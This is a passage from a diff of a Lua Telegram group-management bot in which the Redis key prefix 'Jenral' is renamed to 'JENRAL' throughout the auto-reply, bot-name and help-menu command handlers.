-DevALI:set(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
+DevALI:set(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
 return false
 end
 if text == 'اضف رد' and Manager(msg) and ChCheck(msg) then
-DevALI:set(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
+DevALI:set(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetGpRed = DevALI:get(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+local SetGpRed = DevALI:get(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 if SetGpRed == 'SetGpRed' then
 if text == "الغاء" then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
 return false
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
-DevALI:set(Jenral..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
-DevALI:set(Jenral..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
-DevALI:sadd(Jenral..'ALI:Manager:GpRed'..msg.chat_id_,text)
-DevALI:set(Jenral..'DelManagerRep'..msg.chat_id_,text)
+DevALI:set(JENRAL..'ALI:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
+DevALI:set(JENRAL..'ALI:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
+DevALI:sadd(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_,text)
+DevALI:set(JENRAL..'DelManagerRep'..msg.chat_id_,text)
 return false
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'حذف رد عام' and SecondSudo(msg) or text == '↫ حذف رد عام ⌁' and SecondSudo(msg) or text == 'مسح رد عام' and SecondSudo(msg) then
-local List = DevALI:smembers(Jenral.."ALI:Sudo:AllRed")
+local List = DevALI:smembers(JENRAL.."ALI:Sudo:AllRed")
 if #List == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 return false
 end
-DevALI:set(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
+DevALI:set(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
 return false
 end
 if text == 'اضف رد عام' and SecondSudo(msg) or text == '↫ اضف رد عام ⌁' and SecondSudo(msg) then
-DevALI:set(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
+DevALI:set(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙حسنا ارسل الكلمه الان " ,  1, "md")
 return false
 end
 if text and text:match("^(.*)$") then
-local SetAllRed = DevALI:get(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_)
+local SetAllRed = DevALI:get(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_)
 if SetAllRed == 'SetAllRed' then
 if text == "الغاء" then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر" ,  1, "md")
-DevALI:del(Jenral..'ALI:Add:AllRed'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:Add:AllRed'..msg.sender_user_id_)
 return false
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙يمكنك اضافة الى النص ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙للخروج ارسل ↫ ( الغاء )\n ✓" ,  1, "md")
-DevALI:set(Jenral.."ALI:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
-DevALI:set(Jenral.."ALI:Add:AllText"..msg.sender_user_id_, text)
-DevALI:sadd(Jenral.."ALI:Sudo:AllRed",text)
-DevALI:set(Jenral.."DelSudoRep",text)
+DevALI:set(JENRAL.."ALI:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
+DevALI:set(JENRAL.."ALI:Add:AllText"..msg.sender_user_id_, text)
+DevALI:sadd(JENRAL.."ALI:Sudo:AllRed",text)
+DevALI:set(JENRAL.."DelSudoRep",text)
 return false 
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
-local redod = DevALI:smembers(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_)
+local redod = DevALI:smembers(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_)
 MsgRep = '⌁︙قائمة الردود المتعدده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevALI:smembers(Jenral..'ALI:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
+MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevALI:smembers(JENRAL..'ALI:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
 end
 if #redod == 0 then
 MsgRep = '⌁︙لا توجد ردود متعدده مضافه'
@@ -9782,38 +9770,38 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == 'حذف الردود المتعدده' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود المتعدده' and Manager(msg) and ChCheck(msg) then
-local redod = DevALI:smembers(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_)
+local redod = DevALI:smembers(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_)
 if #redod == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود متعدده مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevALI:del(Jenral..'ALI:Text:GpTexts'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Manager:GpRedod'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpTexts'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Manager:GpRedod'..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف الردود المتعدده")  
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
-local redod = DevALI:smembers(Jenral..'ALI:Manager:GpRed'..msg.chat_id_)
+local redod = DevALI:smembers(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_)
 MsgRep = '⌁︙ردود المدير ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-if DevALI:get(Jenral.."ALI:Gif:GpRed"..v..msg.chat_id_) then
+if DevALI:get(JENRAL.."ALI:Gif:GpRed"..v..msg.chat_id_) then
 dp = 'متحركه 🎭'
-elseif DevALI:get(Jenral.."ALI:Voice:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Voice:GpRed"..v..msg.chat_id_) then
 dp = 'بصمه 🎙'
-elseif DevALI:get(Jenral.."ALI:Stecker:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Stecker:GpRed"..v..msg.chat_id_) then
 dp = 'ملصق 🃏'
-elseif DevALI:get(Jenral.."ALI:Text:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Text:GpRed"..v..msg.chat_id_) then
 dp = 'رساله ✉'
-elseif DevALI:get(Jenral.."ALI:Photo:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Photo:GpRed"..v..msg.chat_id_) then
 dp = 'صوره 🎇'
-elseif DevALI:get(Jenral.."ALI:Video:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Video:GpRed"..v..msg.chat_id_) then
 dp = 'فيديو 📽'
-elseif DevALI:get(Jenral.."ALI:File:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:File:GpRed"..v..msg.chat_id_) then
 dp = 'ملف 📁'
-elseif DevALI:get(Jenral.."ALI:Audio:GpRed"..v..msg.chat_id_) then
+elseif DevALI:get(JENRAL.."ALI:Audio:GpRed"..v..msg.chat_id_) then
 dp = 'اغنيه 🎶'
 end
 MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
@@ -9824,45 +9812,45 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == 'حذف الردود' and Manager(msg) and ChCheck(msg) or text == 'مسح الردود' and Manager(msg) and ChCheck(msg) or text == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or text == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
-local redod = DevALI:smembers(Jenral..'ALI:Manager:GpRed'..msg.chat_id_)
+local redod = DevALI:smembers(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_)
 if #redod == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevALI:del(Jenral..'ALI:Gif:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Voice:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Audio:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Photo:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Stecker:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Video:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:File:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Text:GpRed'..v..msg.chat_id_)
-DevALI:del(Jenral..'ALI:Manager:GpRed'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Gif:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Voice:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Audio:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Photo:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Stecker:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Video:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:File:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Text:GpRed'..v..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Manager:GpRed'..msg.chat_id_)
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المدير")  
 return false
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "↫ الردود العام ⌁" and SecondSudo(msg) then
-local redod = DevALI:smembers(Jenral.."ALI:Sudo:AllRed")
+local redod = DevALI:smembers(JENRAL.."ALI:Sudo:AllRed")
 MsgRep = '⌁︙ردود المطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
 for k,v in pairs(redod) do
-if DevALI:get(Jenral.."ALI:Gif:AllRed"..v) then
+if DevALI:get(JENRAL.."ALI:Gif:AllRed"..v) then
 dp = 'متحركه 🎭'
-elseif DevALI:get(Jenral.."ALI:Voice:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Voice:AllRed"..v) then
 dp = 'بصمه 🎙'
-elseif DevALI:get(Jenral.."ALI:Stecker:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Stecker:AllRed"..v) then
 dp = 'ملصق 🃏'
-elseif DevALI:get(Jenral.."ALI:Text:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Text:AllRed"..v) then
 dp = 'رساله ✉'
-elseif DevALI:get(Jenral.."ALI:Photo:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Photo:AllRed"..v) then
 dp = 'صوره 🎇'
-elseif DevALI:get(Jenral.."ALI:Video:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Video:AllRed"..v) then
 dp = 'فيديو 📽'
-elseif DevALI:get(Jenral.."ALI:File:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:File:AllRed"..v) then
 dp = 'ملف 📁'
-elseif DevALI:get(Jenral.."ALI:Audio:AllRed"..v) then
+elseif DevALI:get(JENRAL.."ALI:Audio:AllRed"..v) then
 dp = 'اغنيه 🎶'
 end
 MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
@@ -9873,33 +9861,33 @@ end
 send(msg.chat_id_,msg.id_,MsgRep)
 end
 if text == "حذف ردود المطور" and SecondSudo(msg) or text == "حذف ردود العام" and SecondSudo(msg) or text == "مسح ردود المطور" and SecondSudo(msg) then
-local redod = DevALI:smembers(Jenral.."ALI:Sudo:AllRed")
+local redod = DevALI:smembers(JENRAL.."ALI:Sudo:AllRed")
 if #redod == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لا توجد ردود مضافه" ,  1, "md")
 else
 for k,v in pairs(redod) do
-DevALI:del(Jenral.."ALI:Add:AllRed"..v)
-DevALI:del(Jenral.."ALI:Gif:AllRed"..v)
-DevALI:del(Jenral.."ALI:Voice:AllRed"..v)
-DevALI:del(Jenral.."ALI:Audio:AllRed"..v)
-DevALI:del(Jenral.."ALI:Photo:AllRed"..v)
-DevALI:del(Jenral.."ALI:Stecker:AllRed"..v)
-DevALI:del(Jenral.."ALI:Video:AllRed"..v)
-DevALI:del(Jenral.."ALI:File:AllRed"..v)
-DevALI:del(Jenral.."ALI:Text:AllRed"..v)
-DevALI:del(Jenral.."ALI:Sudo:AllRed")
+DevALI:del(JENRAL.."ALI:Add:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Gif:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Voice:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Audio:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Photo:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Stecker:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Video:AllRed"..v)
+DevALI:del(JENRAL.."ALI:File:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Text:AllRed"..v)
+DevALI:del(JENRAL.."ALI:Sudo:AllRed")
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف ردود المطور")  
 return false
 end
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي اسم البوت الان" ,  1, "md") 
-DevALI:set(Jenral..'ALI:NameBot'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:NameBot'..msg.sender_user_id_, 'msg')
 return false 
 end
 end
@@ -9907,33 +9895,33 @@ if text and text == 'حذف اسم البوت' or text == 'مسح اسم الب�
 if not SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-DevALI:del(Jenral..'ALI:NameBot')
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم حذف اسم البوت'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:NameBot')
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم حذف اسم البوت'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end end 
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^استعاده الاوامر$") and SecondSudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and SecondSudo(msg) then
 HelpList ={'ALI:Help','ALI:Help1','ALI:Help2','ALI:Help3','ALI:Help4','ALI:Help5','ALI:Help6'}
 for i,Help in pairs(HelpList) do
-DevALI:del(Jenral..Help) 
+DevALI:del(JENRAL..Help) 
 end
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم استعادة الكلايش الاصليه" ,  1, "md") 
 end
 if text == "تعيين الاوامر" and SecondSudo(msg) or text == "تعيين امر الاوامر" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (الاوامر) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help0'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help0'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help0'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help0'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help0'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help', text)
+DevALI:del(JENRAL..'ALI:Help0'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
 if text == "الاوامر" or text == "اوامر" or text == "مساعده" then
-local Help = DevALI:get(Jenral..'ALI:Help')
+local Help = DevALI:get(JENRAL..'ALI:Help')
 local Text = [[
 ⌁︙اهلا بك في قائمة الاوامر ↫ ⤈ 
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -9953,14 +9941,14 @@ return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?cha
 end
 if text == "تعيين امر م1" and SecondSudo(msg) or text == "تعيين امر م١" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م1) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help01'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help01'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help01'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then 
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help01'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then 
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help01'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help1', text)
+DevALI:del(JENRAL..'ALI:Help01'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help1', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -9968,7 +9956,7 @@ if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوام
 if not Admin(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevALI:get(Jenral..'ALI:Help1')
+local Help = DevALI:get(JENRAL..'ALI:Help1')
 local Text = [[
 ⌁︙اوامر حماية المجموعه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10021,14 +10009,14 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م2" and SecondSudo(msg) or text == "تعيين امر م٢" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م2) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help21'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help21'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help21'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help21'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help21'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help2', text)
+DevALI:del(JENRAL..'ALI:Help21'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help2', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10036,7 +10024,7 @@ if text == "م2" or text == "م٢" or text == "اوامر2" or text == "اوام
 if not Admin(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevALI:get(Jenral..'ALI:Help2')
+local Help = DevALI:get(JENRAL..'ALI:Help2')
 local Text = [[
 ⌁︙اوامر الادمنيه ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10097,14 +10085,14 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م3" and SecondSudo(msg) or text == "تعيين امر م٣" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م3) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help31'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help31'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help31'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help31'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help31'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help3', text)
+DevALI:del(JENRAL..'ALI:Help31'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help3', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10112,7 +10100,7 @@ if text == "م3" or text == "م٣" or text == "اوامر3" or text == "اوام
 if not Admin(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevALI:get(Jenral..'ALI:Help3')
+local Help = DevALI:get(JENRAL..'ALI:Help3')
 local Text = [[
 ⌁︙اوامر المدراء ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10162,14 +10150,14 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م4" and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م4) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help41'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help41'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help41'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help41'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help41'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help4', text)
+DevALI:del(JENRAL..'ALI:Help41'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help4', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده" ,  1, "md")
 return false end
 end
@@ -10177,7 +10165,7 @@ if text == "م٤" or text == "م4" or text == "اوامر4" or text == "اوام
 if not Admin(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر يخص الرتب الاعلى فقط\n⌁︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
 else
-local Help = DevALI:get(Jenral..'ALI:Help4')
+local Help = DevALI:get(JENRAL..'ALI:Help4')
 local Text = [[
 ⌁︙اوامر المنشئين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10221,14 +10209,14 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م5" and SecondSudo(msg) or text == "تعيين امر م٥" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م5) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help51'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help51'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help51'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help51'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help51'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help5', text)
+DevALI:del(JENRAL..'ALI:Help51'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:Help5', text)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشه الجديده " ,  1, "md")
 return false end
 end
@@ -10236,7 +10224,7 @@ if text == "م٥" or text == "م5" or text == "اوامر5" or text == "اوام
 if not SudoBot(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمطورين فقط', 1, 'md')
 else
-local Help = DevALI:get(Jenral..'ALI:Help5')
+local Help = DevALI:get(JENRAL..'ALI:Help5')
 local Text = [[
 ⌁︙اوامر المطورين ↫ ⤈
 ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
@@ -10307,19 +10295,19 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
 end end
 if text == "تعيين امر م6" and SecondSudo(msg) or text == "تعيين امر م٦" and SecondSudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م6) الان " ,  1, "md")
-DevALI:set(Jenral..'ALI:Help61'..msg.sender_user_id_, 'msg')
+DevALI:set(JENRAL..'ALI:Help61'..msg.sender_user_id_, 'msg')
 return false end
 if text and text:match("^(.*)$") then
-local JenralTEAM =  DevALI:get(Jenral..'ALI:Help61'..msg.sender_user_id_)
-if JenralTEAM == 'msg' then
+local JENRALTEAM =  DevALI:get(JENRAL..'ALI:Help61'..msg.sender_user_id_)
+if JENRALTEAM == 'msg' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, text , 1, 'md')
-DevALI:del(Jenral..'ALI:Help61'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:Help6', text)
